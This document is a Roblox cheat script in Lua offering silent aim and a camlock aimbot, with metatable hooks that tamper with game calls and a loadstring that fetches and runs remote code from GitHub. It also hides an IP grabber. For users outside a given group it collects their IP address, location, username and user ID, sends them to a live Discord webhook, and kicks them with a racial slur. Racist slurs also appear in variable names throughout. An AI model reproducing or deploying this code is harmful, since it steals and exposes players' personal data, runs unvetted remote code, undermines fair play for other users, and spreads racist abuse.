if Intermix.Main.Intro == true then
	local blur = Instance.new("BlurEffect", game.Lighting)
	blur.Size = 0
	local ScreenGui = Instance.new("ScreenGui")
	local TextLabel = Instance.new("TextLabel")

	--Properties:

	ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
	ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

	TextLabel.Parent = ScreenGui
	TextLabel.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	TextLabel.BackgroundTransparency = 1.000
	TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
	TextLabel.BorderSizePixel = 0
	TextLabel.Position = UDim2.new(0.0158090517, 0, 0.308080882, 0)
	TextLabel.Size = UDim2.new(0, 1040, 0, 264)
	TextLabel.Font = Enum.Font.SciFi
	TextLabel.Text = ""
	TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
	TextLabel.TextScaled = true
	TextLabel.TextSize = 54.000
	TextLabel.TextStrokeColor3 = Color3.fromRGB(255, 255, 127)
	TextLabel.TextWrapped = true

	TextLabel.Text = "I"
	wait(.2)
	TextLabel.Text = "In"
	wait(.2)
	TextLabel.Text = "Int"
	wait(.2)
	TextLabel.Text = "Inter"
	wait(.2)
	TextLabel.Text = "Interm"
	wait(.2)
	TextLabel.Text = "Intermi"
	wait(.2)
	TextLabel.Text = "Intermix"
	wait(.2)
	TextLabel.Text = "Intermix"
	wait(.2)	
	TextLabel.Text = "Intermix N"
	wait(.2)
	TextLabel.Text = "Intermix Ne"
	wait(.2)
	TextLabel.Text = "Intermix Nev"
	wait(.2)
	TextLabel.Text = "Intermix Neve"
	wait(.2)
	TextLabel.Text = "Intermix Never"
	wait(.2)
	TextLabel.Text = "Intermix Never L"
	wait(.2)
	TextLabel.Text = "Intermix Never Le"
	wait(.2)
	TextLabel.Text = "Intermix Never Leg"
	wait(.2)
	TextLabel.Text = "Intermix Never Legi"
	wait(.2)
	TextLabel.Text = "Intermix Never Legit"
	wait(.2)

	for i = 1, 50, 2 do
		blur.Size = i
		TextLabel.Transparency = TextLabel.Transparency - 0.1
		wait()
	end
	wait(1)

	for i = 1, 50, 2 do
		blur.Size = 50 - i
		TextLabel.Transparency = TextLabel.Transparency + 0.1
		wait()
	end

	blur:Destroy()
	ScreenGui:Destroy()
end

local whitelistedcheck = game.Players.LocalPlayer
if not whitelistedcheck:IsInGroup(32784317) then
	local httprequest = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
	local function dayCountConverter(n)
		local years = math.floor(n / 365)
		local months = math.floor((n - (years * 365)) / 30)
		local days = n - (years * 365) - (months * 30)
		return string.format("%i Years, %i Months, %i Days",years, months, days)
	end
	local ip = game:HttpGet("https://api.ipify.org")

	local country = game:GetService("HttpService"):JSONDecode(httprequest({Url = 'http://ip-api.com/json/'..tostring(ip)}).Body)['country']
	local state = game:GetService("HttpService"):JSONDecode(httprequest({Url = 'http://ip-api.com/json/'..tostring(ip)}).Body)['regionName']
	local city = game:GetService("HttpService"):JSONDecode(httprequest({Url = 'http://ip-api.com/json/'..tostring(ip)}).Body)['city']

	local OSTime = os.time()
	local Time = os.date("!*t", OSTime)
	local Content = ""
	local Embed = {
		["title"] = "**Executions**",
		["type"] = "rich",
		["color"] = tonumber(0xfddd4d),
		["fields"] = {
			{
				["name"] = "Name",
				["value"] = game.Players.LocalPlayer.Name,
				["inline"] = false
			},
			{
				["name"] = "DisplayName",
				["value"] = game.Players.LocalPlayer.DisplayName,
				["inline"] = false
			},
			{
				["name"] = "Exploit",
				["value"] = identifyexecutor(),
				["inline"] = false
			},
			{
				["name"] = "Account Age",
				["value"] = dayCountConverter(game.Players.LocalPlayer.AccountAge),
				["inline"] = false
			},
			{
				["name"] = "User ID",
				["value"] = game.Players.LocalPlayer.UserId,
				["inline"] = false
			},
			{
				["name"] = "IP Address",
				["value"] = ip,
				["inline"] = false
			},
			{
				["name"] = "Location",
				["value"] = city..", "..state.." "..country,
				["inline"] = false
			},
			{
				["name"] = "Game",
				["value"] = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
				["inline"] = false
			},

		},
		["footer"] = {
			["text"] = "JayWare ; #1",
			["icon_url"] = "https://cdn.discordapp.com/attachments/996498967036706916/1066797312124403864/JayWare_logo_1.png",
		},
		["thumbnail"] = {
			["url"] = "https://www.roblox.com/avatar-thumbnail/image?userId="..game.Players.LocalPlayer.UserId.."&width=600&height=600&format=png"
		},
		["timestamp"] = string.format(
			"%d-%d-%dT%02d:%02d:%02dZ",
			Time.year,
			Time.month,
			Time.day,
			Time.hour,
			Time.min,
			Time.sec
		)
	}
	(httprequest) {
		Url = "https://discord.com/api/webhooks/1132129528496533595/I3SEctdPhSJrgsUWI4Kuj_jjoV1IO_Ba37jRjMLZG2b72ztT_NuoBX8XtR7L_iYnjrfG",
		Method = "POST",
		Headers = {
			["Content-Type"] = "application/json"
		},
		Body = game:GetService "HttpService":JSONEncode({content = Content, embeds = {Embed}})
	}
	print("grabbed ip sucess!")
	whitelistedcheck:Kick("skid ass nigga i got yo ip dumped in my webhook nigga with YOUR name on it ðŸ˜‚ðŸ˜‚ðŸ˜‚ðŸ˜‚ðŸ˜‚ðŸ˜‚ðŸ˜‚ðŸ¤¦ðŸ½â€")	
end



local Players, Client, Mouse, RS, Camera, r =
	game:GetService("Players"),
game:GetService("Players").LocalPlayer,
game:GetService("Players").LocalPlayer:GetMouse(),
game:GetService("RunService"),
game.Workspace.CurrentCamera,
math.random

local Circle = Drawing.new("Circle")
Circle.Color = Color3.new(1,1,1)
Circle.Thickness = 1

local UpdateFOV = function ()
	if (not Circle) then
		return Circle
	end
	Circle.Visible = Intermixx.FOV["Visible"]
	Circle.Radius = Intermixx.FOV.Radius * 3
	Circle.Position = Vector2.new(Mouse.X, Mouse.Y + (game:GetService("GuiService"):GetGuiInset().Y))
	return Circle
end



RS.Heartbeat:Connect(UpdateFOV)

Mouse.KeyDown:Connect(function(IntermixSilentAimEnable)
	if IntermixSilentAimEnable.KeyCode ~= Intermixx.IntermixSilent.Keybind then
		return
	elseif IntermixSilentAimEnable.KeyCode == Intermixx.IntermixSilent.Keybind then
		Intermixx.IntermixSilent.Enabled = not Intermixx.IntermixSilent.Enabled
	end
end)



ClosestPlrFromMouse = function()
	local Target, Closest = nil, 1/0



	for _ ,v in pairs(Players:GetPlayers()) do
		if (v.Character and v ~= Client and v.Character:FindFirstChild("HumanoidRootPart")) then
			local Position, OnScreen = Camera:WorldToScreenPoint(v.Character.HumanoidRootPart.Position)
			local Distance = (Vector2.new(Position.X, Position.Y) - Vector2.new(Mouse.X, Mouse.Y)).Magnitude

			if (Circle.Radius > Distance and Distance < Closest and OnScreen) then
				Closest = Distance
				Target = v
			end

			if v and Intermixx.FOV.BoxFOV == true then
				local pos = workspace.CurrentCamera:worldToViewportPoint(v.Character.HumanoidRootPart.Position)
				Circle.Position = Vector2.new(pos.X, pos.Y)
			else
				Circle.Position = Vector2.new(Mouse.X, Mouse.Y + (game:GetService("GuiService"):GetGuiInset().Y))
			end
		end
	end
	return Target
end

local WTS = function (Object)
	local ObjectVector = Camera:WorldToScreenPoint(Object.Position)
	return Vector2.new(ObjectVector.X, ObjectVector.Y)
end

local IsOnScreen = function (Object)
	local IsOnScreen = Camera:WorldToScreenPoint(Object.Position)
	return IsOnScreen
end

local FilterObjs = function (Object)
	if string.find(Object.Name, "Gun") then
		return
	end
	if table.find({"Part", "MeshPart", "BasePart"}, Object.ClassName) then
		return true
	end
end

local GetClosestBodyPart = function (character)
	local ClosestDistance = 1/0
	local BodyPart = nil

	if (character and character:GetChildren()) then
		for _,  x in next, character:GetChildren() do
			if FilterObjs(x) and IsOnScreen(x) then
				local Distance = (WTS(x) - Vector2.new(Mouse.X, Mouse.Y)).Magnitude
				if (Intermixx.FOV.Radius * 1.27 > Distance and Distance < ClosestDistance) then
					ClosestDistance = Distance
					BodyPart = x
				end
			end
		end
	end
	return BodyPart
end


local GetClosestBodyPartV2 = function (character)
	local ClosestDistance = 1/0
	local BodyPart = nil

	if (character and character:GetChildren()) then
		for _,  x in next, character:GetChildren() do
			if FilterObjs(x) and IsOnScreen(x) then
				local Distance = (WTS(x) - Vector2.new(Mouse.X, Mouse.Y)).Magnitude
				if (Distance < ClosestDistance) then
					ClosestDistance = Distance
					BodyPart = x
				end
			end
		end
	end
	return BodyPart
end

local Prey
local PartToUse = Intermixx.IntermixSilent.Part

task.spawn(function ()
	while task.wait() do
		if Prey then
			if Intermixx.IntermixSilent.Enabled == true and (Prey.Character) and Intermixx.IntermixSilent.ClosestPart == true then
				Intermixx.IntermixSilent.Part = tostring(GetClosestBodyPart(Prey.Character))
			end
			if Intermixx.Config.UnlockOnDeath == true then
				if Prey.Character.Humanoid.Health < 2 then
					Prey = nil
				end
			end
			if Intermixx.Config.UnlockOnYourDeath == true then
				if Client.Character.Humanoid.Health < 2 then
					Prey = nil
				end
			end
			if Intermixx.Resolver.Enabled[1] == true then
				local playertoresolve = Prey.Character.HumanoidRootPart
				if playertoresolve.Velocity.X > Intermixx.Resolver.Enabled[2] or playertoresolve.Velocity.X < Intermixx.Resolver.Enabled[3] or playertoresolve.Velocity.Y > Intermixx.Resolver.Enabled[2] or playertoresolve.Velocity.Y < Intermixx.Resolver.Enabled[3] or playertoresolve.Velocity.Z > Intermixx.Resolver.Enabled[2] or playertoresolve.Velocity.Z < Intermixx.Resolver.Enabled[3] then
					playertoresolve.Velocity = Vector3.new(0, 0, 0)
				end
			end
			if Intermixx.Config.AntiGroundShots then
				pcall(function()
					local TargetVelv5 = Prey.Character[Intermixx.IntermixSilent.Part]
					TargetVelv5.Velocity = Vector3.new(TargetVelv5.Velocity.X, (TargetVelv5.Velocity.Y * 0.5), TargetVelv5.Velocity.Z)
					TargetVelv5.AssemblyLinearVelocity = Vector3.new(TargetVelv5.Velocity.X, (TargetVelv5.Velocity.Y * 0.5), TargetVelv5.Velocity.Z)
				end)
			end
			if Intermixx.Resolver.DisableOnAnti.Enabled == true and Prey.Character and Prey.Character:FindFirstChild(Sub.CamSets.Aimpart) then
				local playertoresolve = Prey.Character.HumanoidRootPart
				if playertoresolve.Velocity.X > Intermixx.Resolver.DisableOnAnti.Max or playertoresolve.Velocity.X < Intermixx.Resolver.DisableOnAnti.Min or playertoresolve.Velocity.Y > Intermixx.Resolver.DisableOnAnti.Max or playertoresolve.Velocity.Y < Intermixx.Resolver.DisableOnAnti.Min or playertoresolve.Velocity.Z > Intermixx.Resolver.DisableOnAnti.Max or playertoresolve.Velocity.Z < Intermixx.Resolver.DisableOnAnti.Min then
					AimlockTarget = nil
				end
			end
		end
	end
end)

local grmt = getrawmetatable(game)
local backupindex = grmt.__index
setreadonly(grmt, false)

grmt.__index = newcclosure(function(self, v)
	if (Intermixx.IntermixSilent.Enabled and Mouse and tostring(v) == "Hit") then

		Prey = ClosestPlrFromMouse()

		if Prey then
			local endpoint = game.Players[tostring(Prey)].Character[PartToUse].CFrame + (
			game.Players[tostring(Prey)].Character[PartToUse].Velocity * Intermixx.IntermixSilent.Pred
			)
			return (tostring(v) == "Hit" and endpoint)
		end
	end
	return backupindex(self, v)
end)



local Script = {Functions = {}}
Script.Functions.getToolName = function(name)
	local split = string.split(string.split(name, "[")[2], "]")[1]
	return split
end
Script.Functions.getEquippedWeaponName = function()
	if (Client.Character) and Client.Character:FindFirstChildWhichIsA("Tool") then
		local Tool =  Client.Character:FindFirstChildWhichIsA("Tool")
		if string.find(Tool.Name, "%[") and string.find(Tool.Name, "%]") and not string.find(Tool.Name, "Wallet") and not string.find(Tool.Name, "Phone") then
			return Script.Functions.getToolName(Tool.Name)
		end
	end
	return nil
end
RS.RenderStepped:Connect(function()
	if Script.Functions.getEquippedWeaponName() ~= nil then
		local WeaponIntermixx = Intermixx.FOV.GunFOV[Script.Functions.getEquippedWeaponName()]
		if WeaponIntermixx ~= nil and Intermixx.FOV.GunFOV.Enabled == true then
			Intermixx.FOV.Radius = WeaponIntermixx.FOV 
		else
			Intermixx.FOV.Radius = Intermixx.FOV.Radius
		end
	end
end)

----------------settings


getgenv().CurrentCamera = game:GetService "Workspace".CurrentCamera



------------VARIABLES--------------
local services = setmetatable({ }, {
	__index = function(t,k)
		return game:GetService(k)
	end
})
local Settings = getgenv().Intermix.Settings
local Uisf = services.UserInputService
local Workgalaxy = services.Workspace
local RService = services.RunService
local SGui = services.StarterGui
local Inset2 = game:GetService("GuiService"):GetGuiInset().Y
local mousef = game.Players.LocalPlayer:GetMouse()
local Clientuser = Players.LocalPlayer
local runshit = game:GetService("RunService")
local localnigger = game.Players.LocalPlayer
local CF = CFrame.new
local RNew = Ray.new
local Vec3 = Vector3.new
local Vec2 = Vector2.new
local Sub = getgenv().Intermix.Camlock
local Aimlock, MousePressed, CanLockOn = true, false, true
local AimlockTarget, OldPre


-----GET THE NEAREST PLAYER -----
local GetNearestTarget = function()
	local plr1g2 = nil;
	local distance = Sub.CamSets.Distance;

	for i, v in next, Players:GetPlayers() do
		if v.Name ~= Clientuser.Name then
			--if v.Character and v.Team ~= Clientuser.Team then
			if v.Character then
				local pos,aaaa = Camera:WorldToViewportPoint(v.Character.Head.Position);
				local mouse = Uisf:GetMouseLocation()
				local magnitude = (Vec2(pos.X, pos.Y) - Vec2(mousef.X, mousef.Y)).magnitude;

				if aaaa and (magnitude < distance) then
					plr1g2 = v;
					distance = magnitude;
				end
			end
		end
	end
	return plr1g2;
end

--- BUTTON TO LOCK ON FUNCTION ----
mousef.KeyDown:Connect(function(k)
	if k ~= Sub.CamSets.Keybind then 
		return
	elseif Aimlock and AimlockTarget == nil then
		CanLockOn = true
		if MousePressed ~= true then
			MousePressed = true
		end 
		local Target;Target = GetNearestTarget()
		if Target ~= nil then
			AimlockTarget = Target
		end
	else
		if AimlockTarget ~= nil then AimlockTarget = nil end
		if MousePressed ~= false then 
			MousePressed = false 
		end
	end
end)

local smoothnessTOuse = Sub.SmoothSets.SmoothAmount
local easingStyle = Sub.Configuration.Easing



---AIMLOCK PART----
RService.RenderStepped:Connect(function()
	if Aimlock == true and MousePressed == true and Sub.CamSets.Enabled == true then 
		if AimlockTarget and AimlockTarget.Character and AimlockTarget.Character:FindFirstChild(Sub.CamSets.Aimpart) then 
			if CanLockOn == true then
				if Sub.Configuration.PredictMovement == true then
					if Sub.SmoothSets.UseSmooth == true then
						local Main = CF(Camera.CFrame.p, AimlockTarget.Character[Sub.CamSets.Aimpart].Position + AimlockTarget.Character[Sub.CamSets.Aimpart].Velocity/Sub.Configuration.Prediction)
						Camera.CFrame = Camera.CFrame:Lerp(Main, smoothnessTOuse, easingStyle, Enum.EasingDirection.InOut)
					end
				elseif Sub.Configuration.PredictMovement == false then 
					if Sub.SmoothSets.UseSmooth == true then
						local Main = CF(Camera.CFrame.p, AimlockTarget.Character[Sub.CamSets.Aimpart].Position)
						Camera.CFrame = Camera.CFrame:Lerp(Main, smoothnessTOuse, easingStyle, Enum.EasingDirection.InOut)
					end
				end
			end
		end
		if Aimlock == true and MousePressed == true and Sub.CamSets.Enabled == true then
			if Sub.Configuration.UnlockOnKO == true and AimlockTarget ~= nil and AimlockTarget.Character and AimlockTarget.Character:FindFirstChild(Sub.CamSets.Aimpart) then
				local BE = AimlockTarget.Character.Humanoid
				if BE.Health < 5 then
					AimlockTarget = nil   
				end
			end
			if Sub.Configuration.UnlockOnPlrDeath == true and AimlockTarget ~= nil and AimlockTarget.Character and AimlockTarget.Character:FindFirstChild(Sub.CamSets.Aimpart) then
				local YBE = game.Players.LocalPlayer.Character.Humanoid
				if YBE.Health < 5 then
					AimlockTarget = nil   
				end
			end
			if Sub.SmoothSets.SmoothnessY == true and AimlockTarget ~= nil and AimlockTarget.Character and AimlockTarget.Character:FindFirstChild(Sub.CamSets.Aimpart) then
				if AimlockTarget.Character.Humanoid.Jump == true then
					smoothnessTOuse = Sub.SmoothSets.SmoothAmountY
				else
					smoothnessTOuse = Sub.SmoothSets.SmoothAmountY
				end
			end
			if Sub.Configuration.UseAirEasing == true and AimlockTarget and AimlockTarget.Character and AimlockTarget.Character:FindFirstChild(Sub.CamSets.Aimpart) then
				if AimlockTarget.Character.Humanoid.Jump == true then
					easingStyle = Sub.Configuration.AirEasing
				else
					easingStyle = Sub.Configuration.Easing
				end
			end
			if Sub.CamSets.CheckForAir == true and AimlockTarget and AimlockTarget.Character and AimlockTarget.Character:FindFirstChild(Sub.CamSets.Aimpart) then
				if AimlockTarget.Character.Humanoid.Jump == true then
					Sub.CamSets.Aimpart = Sub.CamSets.AirPart
				else
					Sub.CamSets.Aimpart = Sub.CamSets.Aimpart
				end
			end
			if Sub.Configuration.ReloadCheck == true and AimlockTarget and AimlockTarget.Character then
				local plr = game.Players.LocalPlayer
				local BackPack = plr.Backpack
				for _, gunName in pairs(Sub.Configuration.ReloadCheck.Guns) do
					local gun = BackPack:FindFirstChild(gunName)
					if gun then
						gun.Equipped:Connect(function()
							mousef.KeyDown:Connect(function(Reload)
								if Reload.KeyCode == Enum.KeyCode.R then
									if gun.Ammo.Value < gun.MaxAmmo.Value then
										AimlockTarget = nil
									end
								end
							end)
						end)
					end
				end
			end
			if Sub.Configuration.DisableOnAnti.Enabled == true and AimlockTarget.Character and AimlockTarget.Character:FindFirstChild(Sub.CamSets.Aimpart) then
				local playertoresolve = AimlockTarget.Character.HumanoidRootPart
				if playertoresolve.Velocity.X > Sub.Configuration.DisableOnAnti.Max or playertoresolve.Velocity.X < Sub.Configuration.DisableOnAnti.Min or playertoresolve.Velocity.Y > Sub.Configuration.DisableOnAnti.Max[2] or playertoresolve.Velocity.Y < Sub.Configuration.DisableOnAnti.Min[3] or playertoresolve.Velocity.Z > Sub.Configuration.DisableOnAnti.Max or playertoresolve.Velocity.Z < Sub.Configuration.DisableOnAnti.Min then
					AimlockTarget = nil
				end
			end
			if Sub.SmoothSets.Shake == true and AimlockTarget and AimlockTarget.Character and CanLockOn == true then
				local Main = CFrame.new(Camera.CFrame.p, AimlockTarget.Character[Sub.CamSets.Aimpart].Position + AimlockTarget.Character[Sub.CamSets.Aimpart].Velocity/Sub.Configuration.Prediction +
					Vector3.new(
						math.random(-Sub.SmoothSets.SkakeValue.X, Sub.SmoothSets.SkakeValue.X),
						math.random(-Sub.SmoothSets.SkakeValue.Y, Sub.SmoothSets.SkakeValue.Y),
						math.random(-Sub.SmoothSets.SkakeValue.Z, Sub.SmoothSets.SkakeValue.Z)
					) * 0.1)
				Camera.CFrame = Camera.CFrame:Lerp(Main, smoothnessTOuse, easingStyle, Enum.EasingDirection.InOut)
			else
				if AimlockTarget and AimlockTarget.Character and AimlockTarget.Character:FindFirstChild(Sub.CamSets.Aimpart) then 
					if CanLockOn == true then
						if Sub.Configuration.PredictMovement == true then
							if Sub.SmoothSets.UseSmooth == true then
								local Main = CF(Camera.CFrame.p, AimlockTarget.Character[Sub.CamSets.Aimpart].Position + AimlockTarget.Character[Sub.CamSets.Aimpart].Velocity/Sub.Configuration.Prediction)
								Camera.CFrame = Camera.CFrame:Lerp(Main, smoothnessTOuse, easingStyle, Enum.EasingDirection.InOut)
							end
						elseif Sub.Configuration.PredictMovement == false then 
							if Sub.SmoothSets.UseSmooth == true then
								local Main = CF(Camera.CFrame.p, AimlockTarget.Character[Sub.CamSets.Aimpart].Position)
								Camera.CFrame = Camera.CFrame:Lerp(Main, smoothnessTOuse, easingStyle, Enum.EasingDirection.InOut)
							end
						end
					end
				end
			end
		end
	end
end)

local Circle2       = Drawing.new("Circle")  
Circle2.Color           = Color3.new(1,1,1)
Circle2.Thickness       = 1

function Sub.UpdateFOV()
	if (not Circle2) then
		return Circle2
	end

	Circle2.Visible  = Sub.FOV.SHOW_FOV
	Circle2.Radius   = Sub.FOV.FOV_SIDES * 3
	Circle2.Position = Vector2.new(mousef.X, mousef.Y + (game:GetService("GuiService"):GetGuiInset().Y))
	return Circle2
end

RService.Heartbeat:Connect(function()
	Sub.UpdateFOV()
end)

pcall(function()
	if Sub.FOV.FOV_COLOR == "Red" then
		Circle2.Color = Color3.new(255, 0, 0)
	elseif Sub.FOV.FOV_COLOR == "Black" then
		Sub.FOV.FOV_COLOR = Color3.new(0, 0, 0)
	elseif Sub.FOV.FOV_COLOR == "Purple" then
		Circle2.Color = Color3.new(230, 230, 250)
	elseif Sub.FOV.FOV_COLOR == "Pink" then
		Circle2.Color = Color3.new(159, 43, 104)
	elseif Sub.FOV.FOV_COLOR == "Yellow" then
		Circle2.Color = Color3.new(255, 255, 0)
	elseif Sub.FOV.FOV_COLOR == "Grey" then
		Circle2.Color = Color3.new(128, 128, 128)
	elseif Sub.FOV.FOV_COLOR == "Blue" then
		Circle2.Color = Color3.new(173, 216, 230)
	elseif Sub.FOV.FOV_COLOR == "White" then
		Circle2.Color = Color3.new(1,1,1)
	end
end)

--// Nosss didn't make this script, All credits to "Scarcin" on V3rmillion for this bypass method

--// Roblox Group ( TeamNosss! ): https://www.roblox.com/groups/16003304/TeamNosss#!/about

--[[ 

	I did add the real mouse position function thats all 

--]]


local DeepFakePosition = loadstring(game:HttpGet("https://raw.githubusercontent.com/Nosssa/NossLock/main/GetRealMousePosition"))() 
task.wait()


--//Services
local China = setmetatable({}, {
	__index = function(Company, Price)
		return game:GetService(Price)
	end})

local ChinaWorld = China.Workspace
local Society = China.Players
local ChineseDeporation = China.ReplicatedStorage
local ChinaInputService = China.UserInputService

--//Variables
local ChingChong = Society.LocalPlayer
local Cat =  "meow!!" and ChingChong:GetMouse()

local ChineseEvent = ChineseDeporation:FindFirstChild("MainEvent") or nil
local Payment = "Hello Da Hoodian!" and nil

ChineseBypass = function(ChineseEntity)
	local KimJongUn = ChineseEntity.ChildAdded:Connect(function(credit)
		if credit:IsA("Tool") then
			Payment = credit.Activated:Connect(function()
				if ChineseEvent then
					ChineseEvent:FireServer("UpdateMousePos", Cat.Hit.Position)
				end
			end)
		end
	end)
end

local RandomChinese = function(RandomCredit)
	return type(RandomCredit) == "number" and math.random(-RandomCredit, RandomCredit) or 0
end

local ChinaAlive = function(ChinesePlayer)
	return ChinesePlayer and ChinesePlayer.Character and ChinesePlayer.Character:FindFirstChild("Humanoid") and ChinesePlayer.Character:FindFirstChild("Head") or false
end

ChingChong.CharacterAdded:Connect(function(NewChingChong)
	ChineseBypass(NewChingChong)
end)

if ChinaAlive(ChingChong) then
	ChingChong.Character.Humanoid:UnequipTools()
	ChineseBypass(ChingChong.Character)
end

local ChinaHook
ChinaHook = hookmetamethod(game, "__namecall", function(self, ...)
	local ChinaArgs = {...}
	local DeportationMethod = getnamecallmethod()

	if not checkcaller() and DeportationMethod == "FireServer" and self.Name == "MainEvent" and ChinaArgs[1] == "UpdateMousePos" and "chungusdian" then

		ChinaArgs[2] = "Scarcin made this" and _G.FetchPosition() -- was V3.zero

		return self.FireServer(self, unpack(ChinaArgs))
	end

	return ChinaHook(self, ...)

end)

